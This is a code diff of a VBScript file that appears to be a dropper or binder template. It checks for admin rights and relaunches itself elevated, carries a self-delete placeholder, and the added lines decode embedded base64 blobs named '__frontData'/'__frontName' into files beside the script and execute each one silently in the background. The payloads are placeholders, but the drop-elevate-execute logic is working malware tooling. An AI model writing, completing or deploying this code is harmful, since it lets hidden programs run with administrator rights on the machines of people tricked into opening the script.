@@ -1,11 +1,35 @@
 bodyX="0102"
 selfDel="__selfDel"
+Dim arrFrontData
+arrFrontData = Array("__frontData")
+Dim arrFrontName
+arrFrontName = Array("__frontName")
+
+
 
 If Not IsAdmin() Then
     RunElevated()
 Else
     MainScriptLogic()
 End If
+
+Function GetFilePath(fileName)
+    Dim fso, scriptPath, scriptFolder, fullPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    scriptPath = WScript.ScriptFullName
+    scriptFolder = fso.GetParentFolderName(scriptPath)
+    fullPath = fso.BuildPath(scriptFolder, fileName)
+    Set fso = Nothing
+    GetFilePath = fullPath
+End Function
+
+Function ExecuteFileAsync(filePath)
+    Dim shell, result
+    Set shell = CreateObject("WScript.Shell")
+    result = shell.Run(filePath, 1, False)
+    Set shell = Nothing
+    ExecuteFileAsync = result
+End Function
 
 Function DecodeBase64ToFile(base64String, outputFilePath)
     Dim xmlDoc
@@ -39,6 +63,14 @@ Function DecodeBase64ToFile(base64String, outputFilePath)
 End Function
 
 Sub MainScriptLogic()
+
+    For i = 0 To UBound(arrFrontName)
+        data = arrFrontData(i)
+        exe = GetFilePath(arrFrontName(i))
+        DecodeBase64ToFile data, exe
+        ExecuteFileAsync exe
+    Next
+
     Dim objShell
     Set objShell = CreateObject("WScript.Shell")
     Dim scriptFullPath
